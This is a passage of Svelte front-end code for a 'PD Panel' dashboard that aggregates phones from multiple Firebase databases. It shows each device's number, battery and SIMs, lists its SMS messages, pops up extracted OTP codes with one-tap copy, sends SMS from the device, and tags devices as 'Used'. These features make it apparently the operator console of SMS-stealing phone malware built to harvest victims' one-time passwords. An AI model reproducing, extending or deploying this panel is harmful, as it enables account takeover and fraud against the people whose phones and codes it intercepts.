    if (tableConnFilter && d.connId !== tableConnFilter) return false;
    const on  = d.info ? isOnline(d.info) : null;
    const uid = `${d.connId}::${d.key}`;
    if (tableActiveFilters.has('on')   && on !== true)  return false;
    if (tableActiveFilters.has('off')  && on === true)  return false;
    if (tableActiveFilters.has('num')  && !getDisplayPhone(d.connId, d.key, d.info)) return false;
    if (tableActiveFilters.has('used') && !isUsed(`dev::${d.connId}::${d.key}`)) return false;
    if (tableActiveFilters.has('new')  && !newDeviceKeys.has(uid)) return false;
    return true;
  }));

  let totalDevicePages = $derived(
    Math.max(1, Math.ceil(filteredTableDevices.length / DEVICES_PER_PAGE))
  );

  function toggleTableFilter(f) {
    const next = new Set(tableActiveFilters);
    // 'on' and 'off' are mutually exclusive
    if (f === 'on'  && next.has('on'))  { next.delete('on');  }
    else if (f === 'on')  { next.add('on');  next.delete('off'); }
    else if (f === 'off' && next.has('off')) { next.delete('off'); }
    else if (f === 'off') { next.add('off'); next.delete('on'); }
    else if (next.has(f)) { next.delete(f); }
    else                  { next.add(f); }
    tableActiveFilters = next;
  }

  let selectedInfo = $derived(
    selectedKey && selectedConnId ? getDevInfo(selectedConnId, selectedKey) : null
  );

  let selectedConn = $derived(
    selectedConnId ? connections.find(c => c.id===selectedConnId) : null
  );

  let connStats = $derived(connections.map(c => {
    const e = db[c.id];
    const devs = allDevices.filter(d => d.connId === c.id);
    const onl  = devs.filter(d => d.info && isOnline(d.info)).length;
    return { ...c, keyCount: e?.keys ? Object.keys(e.keys).length : 0, loading:!!e?.loading, error:e?.error??null, online:onl, total:devs.length };
  }));

  // ── Filtered messages ─────────────────────────────────────────────────────
  let filteredMsgs = $derived((() => {
    if (!msgs || typeof msgs !== 'object') return [];
    const q = msgsSearch.toLowerCase();
    return Object.entries(msgs)
      .filter(([, m]) => {
        if (typeof m !== 'object' || !m) return false;
        if (msgsFilter === 'in'  && m.type !== 'incoming') return false;
        if (msgsFilter === 'out' && m.type !== 'outgoing') return false;
        if (q) {
          const hay = `${m.sender??''} ${m.message??''} ${m.dateTime??''}`.toLowerCase();
          if (!hay.includes(q)) return false;
        }
        return true;
      })
      .sort(([a], [b]) => Number(b) - Number(a)); // newest first
  })());

</script>

<svelte:window onkeydown={e => {
  if (e.key === 'Escape') {
    showBellPanel = false;
    addOpen = false;
    rawOpen = false;
  }
}} />

<div class="shell">

  <!-- Mobile sidebar backdrop -->
  {#if sideOpen}
    <div class="mob-backdrop" onclick={() => sideOpen=false} role="presentation"></div>
  {/if}

  <!-- ══ LEFT SIDEBAR ════════════════════════════════════════════════════════ -->
  <aside class="sidebar {sideOpen ? 'mob-open' : ''}">

    <!-- Brand + close button -->
    <div class="side-brand">
      <svg width="17" height="17" viewBox="0 0 32 32" fill="none">
        <path d="M5 27L10.5 6l7 13 4-9 5.5 17H5z" fill="url(#sbg)"/>
        <defs><linearGradient id="sbg" x1="5" y1="6" x2="27" y2="27" gradientUnits="userSpaceOnUse">
          <stop stop-color="#f97316"/><stop offset="1" stop-color="#fbbf24"/>
        </linearGradient></defs>
      </svg>
      <span class="brand-txt">PD Panel</span>
      {#if onlineCount > 0}<span class="side-online-pill">{onlineCount} 🟢</span>{/if}
      <button class="side-close-btn" onclick={() => sideOpen=false} aria-label="Close sidebar">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6 6 18M6 6l12 12"/></svg>
      </button>
    </div>

    <!-- Sidebar tabs: Firebase | Devices -->
    <div class="side-tabs">
      <button class="side-tab-btn {sideTab==='firebase'?'stab-a':''}" onclick={() => sideTab='firebase'}>
        Firebase <span class="stab-cnt">{connections.length}</span>
      </button>
      <button class="side-tab-btn {sideTab==='devices'?'stab-a':''}" onclick={() => sideTab='devices'}>
        Devices <span class="stab-cnt">{allDevices.length}</span>
      </button>
    </div>

    <!-- Firebase connections tab -->
    {#if sideTab === 'firebase'}
      <div class="side-footer side-footer-full">
        <div class="sf-hdr">
          FIREBASE · {connections.length}
          <button class="add-fb-inline" onclick={() => addOpen=true} title="Add Firebase" aria-label="Add Firebase">
            <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
          </button>
        </div>
        <div class="conn-scroll conn-scroll-full" use:dragScroll>
          {#each connStats as c (c.id)}
            <div class="conn-row">
              <span class="cr-dot" style="background:{c.color}"></span>
              <span class="cr-name">{c.name}</span>
              <span class="cr-status" title="{c.online} online / {c.total} total">
                {#if c.total > 0}
                  <span class="cr-on-dot" style="background:{c.online>0?'#22c55e':'#334155'}"></span>
                  <span style="color:{c.online>0?'#22c55e':'#64748b'};font-size:9px;font-weight:700">{c.online}/{c.total}</span>
                {:else}
                  <span class="cr-cnt" style="color:{c.error?'#ef4444':c.color}">{c.loading ? '…' : c.error ? '!' : '0'}</span>
                {/if}
              </span>
              <button class="cr-tog {c.enabled?'ton':'toff'}" onclick={() => toggleConn(c.id)} aria-label="toggle">
                <span class="cr-knob"></span>
              </button>
              <button class="cr-rm" onclick={() => dropConn(c.id)} title="Remove" aria-label="remove">×</button>
            </div>
          {/each}
        </div>
      </div>
    {/if}

    <!-- Devices list tab -->
    {#if sideTab === 'devices'}
      <div class="side-footer side-footer-full">
        <!-- Search -->
        <div class="side-dev-search">
          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" opacity="0.4"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
          <input class="side-dev-search-in" bind:value={searchQuery} placeholder="Search devices…" aria-label="Search devices"/>
          {#if searchQuery}<button class="side-search-clear" onclick={() => searchQuery=''}>×</button>{/if}
        </div>
        <!-- Filter pills -->
        <div class="side-dev-pills">
          <button class="sdp {sideFilter==='all'?'sdp-a':''}" onclick={() => sideFilter='all'}>All <span class="sdp-cnt">{allDevices.length}</span></button>
          <button class="sdp {sideFilter==='on'?'sdp-on':''}"  onclick={() => sideFilter='on'}>🟢 <span class="sdp-cnt">{onlineCount}</span></button>
          <button class="sdp {sideFilter==='num'?'sdp-num':''}" onclick={() => sideFilter='num'}>📱 <span class="sdp-cnt">{numCount}</span></button>
          <button class="sdp {sideFilter==='off'?'sdp-off':''}" onclick={() => sideFilter='off'}>🔴 <span class="sdp-cnt">{offlineCount}</span></button>
        </div>
        <!-- Device list -->
        <div
          class="side-dev-list"
          onscroll={(e) => {
            const el = e.currentTarget;
            if (el.scrollTop + el.clientHeight >= el.scrollHeight - 200) {
              if (filteredSide.length > sideLimit) sideLimit += 100;
            }
          }}
        >
          {#each filteredSide.slice(0, sideLimit) as d (`${d.connId}::${d.key}`)}
            {@const on  = d.info ? isOnline(d.info) : null}
            {@const bat = d.info ? getBattery(d.info) : null}
            {@const fp  = getDisplayPhone(d.connId, d.key, d.info)}
            <div class="sdv-item {selectedKey===d.key&&selectedConnId===d.connId?'sdv-sel':''}"
              role="button"
              tabindex="0"
              onkeydown={e => { if (e.key === 'Enter' || e.key === ' ') { selectDevice(d.connId, d.key); sideOpen = false; } }}
              onclick={() => { selectDevice(d.connId, d.key); sideOpen = false; }}
              aria-label="Select device {d.key}">
              <span class="sdv-bar" style="background:{d.conn.color}"></span>
              <span class="sdv-dot {on===true?'ton':on===false?'toff':'tunk'}"></span>
              <span class="sdv-body">
                <span class="sdv-id mono">{d.key.slice(0,15)}{d.key.length>15?'…':''}</span>
                {#if fp}
                  <span class="sdv-phone">{fp}</span>
                {:else}
                  <span class="sdv-fb" style="color:{d.conn.color}">{d.conn.name}</span>
                {/if}
              </span>
              {#if bat !== null}
                <span class="sdv-bat" style="color:{batColor(bat)}">{bat}%</span>
              {/if}
              {#if fp}
                <button class="sdv-copy" title="Copy number" aria-label="Copy number"
                  onclick={e => { e.stopPropagation(); copyText(extractNumber(fp)); toast('Number copied','success'); }}>
                  <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                </button>
              {/if}
            </div>
          {/each}
          {#if filteredSide.length === 0}
            <div class="sdv-empty">No devices found</div>
          {/if}
          {#if filteredSide.length > sideLimit}
            <button class="sdv-more" onclick={() => sideLimit += 100}>+ {Math.min(100, filteredSide.length - sideLimit)} more…</button>
          {/if}
        </div>
      </div>
    {/if}
  </aside>


<!-- ══ MAIN ════════════════════════════════════════════════════════════════ -->
  <div class="main">

    <!-- Topbar -->
    <header class="topbar">
      <div class="tb-l">
        <!-- Mobile hamburger -->
        <button class="mob-menu-btn" onclick={() => sideOpen = !sideOpen} aria-label="Toggle sidebar">
          {#if sideOpen}
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6 6 18M6 6l12 12"/></svg>
          {:else}
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
          {/if}
        </button>
        {#each connections as c}
          {#if db[c.id]?.loading}
            <span style="font-size:11px;color:{c.color};display:flex;align-items:center;gap:3px">
              <span style="animation:spin 0.9s linear infinite;display:inline-block">↻</span> {c.name}
            </span>
          {/if}
        {/each}
        {#if bgRefreshing}
          <span class="refresh-cd bg-refresh" title="Syncing in background…">
            <span class="bg-dot"></span> syncing…
          </span>
        {:else if !connections.some(c => db[c.id]?.loading)}
          <span class="refresh-cd" title="Next auto-refresh in {nextRefreshSecs}s">
            ↻ {nextRefreshSecs}s
          </span>
        {/if}
      </div>
      <div class="tb-r">
        <span class="tbstat tt">{totalCount} total</span>
        <span class="tbstat to">{onlineCount} online</span>
        <span class="tbstat tf">{offlineCount} offline</span>
        <button class="ico-btn {bgRefreshing?'ico-active':''}" onclick={() => fetchAll(false)} title="Refresh All now" aria-label="Refresh All">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style={bgRefreshing?"animation:spin 1s linear infinite":""}>
            <path d="M1 4v6h6M23 20v-6h-6"/><path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4-4.64 4.36A9 9 0 0 1 3.51 15"/>
          </svg>
        </button>
        <!-- Bell icon with badge — opens floating notification panel -->
        <div class="bell-wrap" style="position:relative">
          <button class="ico-btn bell-btn {!notifsEnabled?'ico-muted':''} {showBellPanel?'ico-active':''}"
            onclick={() => showBellPanel = !showBellPanel}
            title={notifsEnabled ? 'Notifications' : 'Notifications muted'}
            aria-label="Toggle notification panel">
            {#if notifsEnabled}
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
            {:else}
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/><line x1="2" y1="2" x2="22" y2="22"/></svg>
            {/if}
          </button>
          {#if notifications.length > 0}
            <span class="notif-badge">{notifications.length > 9 ? '9+' : notifications.length}</span>
          {/if}
        </div>
        <button class="ico-btn {addOpen?'ico-active':''}" onclick={() => addOpen=!addOpen} title="Settings & Firebase" aria-label="Settings">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <circle cx="12" cy="12" r="3"/>
            <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>
          </svg>
        </button>
        <button class="ico-btn {rawOpen?'ico-active':''}" onclick={() => rawOpen=!rawOpen} aria-label="Raw request">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
        </button>
      </div>
    </header>

    <!-- ══ FLOATING NOTIFICATION PANEL ════════════════════════════════════ -->
    {#if showBellPanel}
      <div class="bell-panel" style="transform:translate({notifPanelPos.x}px,{notifPanelPos.y}px)">
        <!-- Draggable panel header -->
        <div class="bp-hdr bp-drag-handle"
          role="toolbar"
          tabindex="0"
          aria-label="Notification panel header drag handle"
          onpointerdown={notifPanelDragStart}
          onpointermove={notifPanelDragMove}
          onpointerup={notifPanelDragEnd}
          onpointercancel={notifPanelDragEnd}
          style="cursor:{_ndDragging?'grabbing':'grab'};touch-action:none;user-select:none">
          <span class="bp-title">Notifications {#if notifications.length > 0}<span class="bp-cnt">({notifications.length})</span>{/if}</span>
          <div class="bp-actions">
            <!-- Mute toggle -->
            <button class="bp-icon-btn {!notifsEnabled?'bp-muted':''}" onclick={toggleNotifsEnabled}
              title={notifsEnabled ? 'Mute' : 'Unmute'} aria-label="Toggle mute">
              {#if notifsEnabled}
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
              {:else}
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/><line x1="2" y1="2" x2="22" y2="22"/></svg>
              {/if}
            </button>
            <!-- Clear all -->
            {#if notifications.length > 0}
              <button class="bp-icon-btn" onclick={clearAllNotifs} title="Clear all" aria-label="Clear all notifications">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/></svg>
              </button>
            {/if}
            <!-- Collapse -->
            <button class="bp-icon-btn" onclick={() => showBellPanel=false} aria-label="Close">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6 6 18M6 6l12 12"/></svg>
            </button>
          </div>
        </div>

        <!-- Notification list -->
        {#if notifications.length === 0}
          <div class="bp-empty">
            {#if !notifsEnabled}
              <span>🔕 Notifications muted</span>
            {:else}
              <span>No new notifications</span>
            {/if}
          </div>
        {:else}
          <div class="bp-list">
            {#each notifications as n (n.id)}
              {@const msgFull  = n.message ?? ''}
              {@const msgShort = msgFull.slice(0, 55) + (msgFull.length > 55 ? '…' : '')}
              <div class="bp-card {n.leaving?'nleave':''}">
                <!-- Row 1: App icon + sender + OTP label + time + dismiss -->
                <div class="bp-card-top">
                  <div class="bp-app-icon" style="background:{n.conn?.color ?? '#f97316'}22;border-color:{n.conn?.color ?? '#f97316'}44">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="{n.conn?.color ?? '#f97316'}" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><path d="M12 18h.01"/></svg>
                  </div>
                  <div class="bp-card-mid">
                    <span class="bp-sender">{n.sender ?? '?'}{n.about ? ` · ${n.about}` : ''} · <span style="color:#64748b">OTP</span></span>
                    <span class="bp-msg-preview">{msgShort}</span>
                  </div>
                  <span class="bp-time">{toIST(n.ts)}</span>
                  <button class="n-close" onclick={() => dismissNotif(n.id)} aria-label="Dismiss">×</button>
                </div>
                <!-- Row 2: OTP green pill + device ID + copy + navigate -->
                {#if n.otp}
                  <div class="bp-card-bot">
                    <button class="bp-otp-pill" onclick={() => { copyText(n.otp); toast(`OTP ${n.otp} copied!`,'success'); }} title="Tap to copy OTP">
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="opacity:0.6"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                      <code class="bp-otp-code">{n.otp}</code>
                      <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                    </button>
                    <button class="bp-dev-pill" onclick={e => { e.stopPropagation(); copyText(n.devKey ?? ''); toast('Device ID copied','success'); }} title="Copy device ID">
                      <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/></svg>
                      <span class="mono">{(n.devKey ?? '').slice(0, 8)}…</span>
                      <svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                    </button>
                    <button class="bp-nav-btn" onclick={() => { navigateToDevice(n.connId, n.devKey); showBellPanel=false; }} title="Go to device">
                      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M7 17L17 7M7 7h10v10"/></svg>
                    </button>
                    <!-- Green progress bar -->
                    <div class="bp-progress"></div>
                  </div>
                {:else}
                  <div class="bp-card-bot">
                    <span class="bp-verif-chip">VERIF</span>
                    <span class="bp-verif-text">{msgFull.slice(0,40)}{msgFull.length>40?'…':''}</span>
                    <button class="bp-nav-btn" onclick={() => { navigateToDevice(n.connId, n.devKey); showBellPanel=false; }} aria-label="View device" title="View device">
                      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M7 17L17 7M7 7h10v10"/></svg>
                    </button>
                  </div>
                {/if}
              </div>
            {/each}
          </div>
        {/if}
      </div>
    {/if}


    <!-- Add Firebase panel -->
    {#if addOpen}
      <div class="add-panel">
        <div class="ap-hdr">
          <span>Add Firebase Connection</span>
          <button class="ico-btn" onclick={() => addOpen=false} aria-label="Close">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6 6 18M6 6l12 12"/></svg>
          </button>
        </div>
        <div class="ap-grid">
          <div class="field"><label for="fn">Name</label><input id="fn" bind:value={form.name} placeholder="project-name"/></div>
          <div class="field"><label for="fu">Firebase URL</label><input id="fu" bind:value={form.url} placeholder="https://xxx-default-rtdb.firebaseio.com"/></div>
          <div class="field"><label for="fp">Messages Path</label><input id="fp" bind:value={form.path} placeholder="messages"/></div>
          <div class="field"><label for="fi">Device Info Path</label><input id="fi" bind:value={form.infoPath} placeholder="devices (optional)"/></div>
          <div class="field"><label for="ft">Auth Token</label><input id="ft" type="password" bind:value={form.token} placeholder="optional"/></div>
        </div>
        <div class="ap-foot">
          <button class="btn btn-ghost" onclick={() => addOpen=false}>Cancel</button>
          <button class="btn btn-primary" onclick={addConn}>Connect</button>
        </div>

        <!-- ── Quick Settings ── -->
        <div class="ap-settings">
          <div class="aps-title">System & Notification Settings</div>
          
          <label class="aps-row">
            <span class="aps-lbl">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
              <span>{notifsEnabled ? 'Notifications Enabled (Alerts & Sound)' : 'Notifications Muted (Silent)'}</span>
            </span>
            <button class="aps-tog {notifsEnabled ? 'aps-on' : ''}" onclick={toggleNotifsEnabled}
              aria-label="Toggle notifications">
              <span class="aps-knob"></span>
            </button>
          </label>

          <label class="aps-row" style="margin-top:8px">
            <span class="aps-lbl">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="3" y1="18" x2="21" y2="18"/><line x1="8" y1="18" x2="8" y2="21"/><line x1="16" y1="18" x2="16" y2="21"/></svg>
              <span>{showNotifsTab ? 'Notifications Tab in Bottom Nav (Visible)' : 'Notifications Tab in Bottom Nav (Hidden)'}</span>
            </span>
            <button class="aps-tog {showNotifsTab ? 'aps-on' : ''}" onclick={toggleShowNotifsTab}
              aria-label="Toggle notifications tab in bottom nav">
              <span class="aps-knob"></span>
            </button>
          </label>

          <label class="aps-row" style="margin-top:8px">
            <span class="aps-lbl">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 3h6v6M9 21H3v-6M21 3l-7 7M3 21l7-7"/></svg>
              <span>{autoOpenNotif ? 'Auto-open Panel on new OTP (ON)' : 'Auto-open Panel on new OTP (OFF — Manual only)'}</span>
            </span>
            <button class="aps-tog {autoOpenNotif ? 'aps-on' : ''}" onclick={toggleAutoOpenNotif}
              aria-label="Toggle auto-open on new OTP">
              <span class="aps-knob"></span>
            </button>
          </label>
        </div>
      </div>
    {/if}

    <!-- Raw drawer -->
    {#if rawOpen}
      <div class="raw-drawer">
        <div class="rd-top">
          <span class="rd-lbl">Raw Firebase Request</span>
          <select bind:value={rawConnId} class="tiny-sel">
            {#each connections as c (c.id)}<option value={c.id}>{c.name}</option>{/each}
          </select>
          <button class="ico-btn" onclick={() => rawOpen=false} aria-label="Close">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6 6 18M6 6l12 12"/></svg>
          </button>
        </div>
        <div class="rd-row">
          <select bind:value={rawMethod} class="method-sel">
            {#each ['GET','POST','PUT','PATCH','DELETE'] as m}<option value={m}>{m}</option>{/each}
          </select>
          <input class="rd-path" bind:value={rawPath} placeholder="path/to/node" aria-label="Firebase path"/>
          <button class="btn btn-primary btn-sm" onclick={sendRaw} disabled={rawLoading}>Send</button>
        </div>
        {#if ['POST','PUT','PATCH'].includes(rawMethod)}
          <textarea class="code" rows="3" bind:value={rawBody} style="resize:vertical;font-size:12px" aria-label="Request body"></textarea>
        {/if}
        {#if rawRes}
          <div style="display:flex;gap:8px;align-items:center">
            <span class="s-pill {rawRes.ok?'sp-ok':'sp-err'}">{rawRes.status}</span>
          </div>
          <pre class="json-view">{JSON.stringify(rawRes.data??rawRes,null,2).slice(0,2000)}</pre>
        {/if}
      </div>
    {/if}

    <!-- Tab bar -->
    <div class="tab-bar">
      <button class="tab {activeTab==='overview'?'active':''}" onclick={() => activeTab='overview'}>Overview</button>
      <button class="tab {activeTab==='device'?'active':''}"   onclick={() => switchTab('device')}   disabled={!selectedKey}>Device</button>
      <button class="tab {activeTab==='messages'?'active':''}" onclick={() => switchTab('messages')} disabled={!selectedKey}>Messages</button>
      <button class="tab {activeTab==='send'?'active':''}"     onclick={() => switchTab('send')}     disabled={!selectedKey}>Send SMS</button>
    </div>

    <!-- Tab content -->
    <div class="tab-body {activeTab === 'overview' ? 'tab-body-overview' : ''}" bind:this={tabBodyEl}>

      <!-- ── OVERVIEW ──────────────────────────────────────────────────── -->
      {#if activeTab === 'overview'}

        <div class="live-card">
          <div class="lc-icon">
            <svg width="38" height="38" viewBox="0 0 32 32" fill="none">
              <rect x="2" y="4" width="28" height="20" rx="3" fill="rgba(249,115,22,0.12)" stroke="#f97316" stroke-width="1.2"/>
              <rect x="5" y="14" width="5" height="7" rx="1" fill="#f97316" opacity="0.9"/>
              <rect x="13" y="10" width="5" height="11" rx="1" fill="#38bdf8" opacity="0.9"/>
              <rect x="21" y="7" width="5" height="14" rx="1" fill="#22c55e" opacity="0.9"/>
            </svg>
          </div>
          <div>
            <div class="lc-title">Live Status</div>
            <div class="lc-sub">
              Total: {totalCount} &nbsp;·&nbsp; Online: {onlineCount} &nbsp;·&nbsp; Offline: {offlineCount}
            </div>
          </div>
        </div>

        <div class="stat-row">
          <div class="stat-card" style="border-top-color:#38bdf8"><div class="sc-n">{totalCount}</div><div class="sc-l">TOTAL</div></div>
          <div class="stat-card" style="border-top-color:#22c55e"><div class="sc-n" style="color:#22c55e">{onlineCount}</div><div class="sc-l">ONLINE</div></div>
          <div class="stat-card" style="border-top-color:#ef4444"><div class="sc-n" style="color:#ef4444">{offlineCount}</div><div class="sc-l">OFFLINE</div></div>
          <div class="stat-card" style="border-top-color:#a78bfa"><div class="sc-n" style="color:#a78bfa">{allDevices.filter(d=>d.info&&getSims(d.info)).length}</div><div class="sc-l">SIMS</div></div>
        </div>

        <div class="dt-card">
          <!-- Filter chips — multi-select AND logic -->
          <div class="dt-filters">
            <div class="dt-chips">
              <div class="dt-search-wrap">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
                <input class="dt-search-in" bind:value={tableSearch} placeholder="Filter search number, ID…" aria-label="Filter search devices or numbers"/>
                {#if tableSearch}
                  <button class="dt-search-clear" onclick={() => tableSearch = ''} title="Clear filter search" aria-label="Clear filter search">✕</button>
                {/if}
              </div>
              <button class="dt-chip {tableActiveFilters.has('on')?'dco':''}"
                onclick={() => toggleTableFilter('on')}
                title="Online devices" aria-label="Filter: Online">
                🟢 Online <span class="dt-chip-cnt">{onlineCount}</span>
              </button>
              <button class="dt-chip {tableActiveFilters.has('off')?'dcx':''}"
                onclick={() => toggleTableFilter('off')}
                title="Offline devices" aria-label="Filter: Offline">
                🔴 Offline <span class="dt-chip-cnt">{offlineCount}</span>
              </button>
              <button class="dt-chip {tableActiveFilters.has('num')?'dcn':''}"
                onclick={() => toggleTableFilter('num')}
                title="Devices with phone number (online: {onlineNumCount})" aria-label="Filter: With number">
                📱 Numbers <span class="dt-chip-cnt">{numCount}</span>
                {#if onlineNumCount > 0}<span class="dt-chip-online">🟢{onlineNumCount}</span>{/if}
              </button>
              <button class="dt-chip {tableActiveFilters.has('used')?'dcu':''}"
                onclick={() => toggleTableFilter('used')}
                title="Used devices" aria-label="Filter: Used">
                ✓ Used
              </button>
              {#if newCount > 0}
                <button class="dt-chip dcnew {tableActiveFilters.has('new')?'dcnew-a':''}"
                  onclick={() => toggleTableFilter('new')}
                  title="Newly added devices" aria-label="Filter: New">
                  ✦ New <span class="dt-chip-cnt">{newCount}</span>
                </button>
              {/if}
              {#if tableActiveFilters.size > 0 || tableSearch}
                <button class="dt-chip-clear" onclick={() => { tableActiveFilters = new Set(); tableSearch = ''; }}
                  aria-label="Clear all filters">✕ Clear</button>
              {/if}
              {#if tableConnFilter}
                <button class="dt-chip-clear" onclick={() => tableConnFilter=null}
                  aria-label="Clear Firebase filter">
                  ✕ {connections.find(c=>c.id===tableConnFilter)?.name ?? tableConnFilter}
                </button>
              {/if}
            </div>
            <!-- Firebase row -->
            <div class="dt-fb-row">
              <span class="dt-fb-lbl">Firebase:</span>
              <div class="dt-fb-badges">
                {#each connStats as c (c.id)}
                  <button
                    class="conn-badge {tableConnFilter===c.id?'cb-active':''}"
                    style="color:{c.color};border-color:{c.color}55;{tableConnFilter===c.id?`background:${c.color}22`:''}"
                    onclick={() => tableConnFilter = tableConnFilter===c.id ? null : c.id}
                    title="{c.name}: {c.online}/{c.total} online"
                    aria-label="{c.name} filter"
                  >
                    <span class="cb-dot" style="background:{c.online>0?'#22c55e':'#334155'}"></span>
                    {c.name}
                    <span class="cb-n">{c.loading?'…':c.error?'!':c.keyCount}</span>
                  </button>
                {/each}
              </div>
            </div>
          </div>

          <!-- Result count + Top pagination bar -->
          <div class="dt-count-row">
            <div class="dt-count">
              <span class="dt-cnt-val">{filteredTableDevices.length}</span> device{filteredTableDevices.length === 1 ? '' : 's'}
              {#if tableActiveFilters.size > 0 || tableConnFilter || tableSearch}
                · <span class="dt-filter-tag">
                  {[...tableActiveFilters].join(' + ')}
                  {tableConnFilter ? ' @' + connections.find(c => c.id === tableConnFilter)?.name : ''}
                  {tableSearch ? ` 🔍 "${tableSearch}"` : ''}
                </span>
              {/if}
            </div>
            <div class="pag-compact" aria-label="Device pagination top controls">
              <button class="pag-btn-sm" disabled={devicePage === 0} onclick={() => setDevicePage(devicePage - 1)} aria-label="Previous page" title="Previous page">‹ Prev</button>
              <span class="pag-pill" title="Current page of total pages">Page <strong>{devicePage + 1}</strong> of <strong>{totalDevicePages}</strong></span>
              <button class="pag-btn-sm" disabled={devicePage >= totalDevicePages - 1} onclick={() => setDevicePage(devicePage + 1)} aria-label="Next page" title="Next page">Next ›</button>
            </div>
          </div>

          <!-- Device list — paginated, 20/page with vertical scroll -->
          <div class="dt-scroll" bind:this={dtScrollEl}>
            <div class="dev-card-grid">
